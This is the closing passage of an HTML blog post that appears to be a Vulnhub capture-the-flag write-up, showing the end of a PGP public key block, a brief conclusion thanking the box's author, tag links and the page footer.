<span class="n">XQk6Oc7xWEgxLH</span><span class="o">+</span><span class="n">IjNQgh6V</span><span class="o">+</span><span class="n">MTce8fOp2SEVPcMZZuz2</span><span class="o">+</span><span class="n">XI9nrCV1dfAcwJJyF58</span><span class="w"></span>
<span class="n">RryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw</span><span class="o">/</span><span class="n">nNCEwQexWrgW7bqL</span><span class="o">/</span><span class="n">N8</span><span class="w"></span>
<span class="n">TM2C0X57</span><span class="o">+</span><span class="n">ok7eqj8gUEuX</span><span class="o">/</span><span class="mi">6</span><span class="n">FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU</span><span class="w"></span>
<span class="n">Gms</span><span class="o">=</span><span class="w"></span>
<span class="o">=</span><span class="n">PiAQ</span><span class="w"></span>
<span class="c1">-----END PGP PUBLIC KEY BLOCK-----</span>
</code></pre></div>
<h2>Conclusion</h2>
<p>This box was fun. The url were unpredictable and dirbuster doesn't spoil all the
fun for us. Thank to <a href="https://twitter.com/@ly0nx">@ly0nx</a> for this box and
<a href="http://vulnhub.com">vulnhub</a> as always.</p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/security.html">security</a>
<a href="../../tag/vulnhub.html">vulnhub</a>
<a href="../../tag/challenge.html">challenge</a>
<a href="../../tag/linux.html">linux</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2015/09/vulnhub-acid.html" title="Vulnhub - Acid">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2016/02/auditing-exchange-server.html" title="Auditing Exchange Server">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p> </footer>
</main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>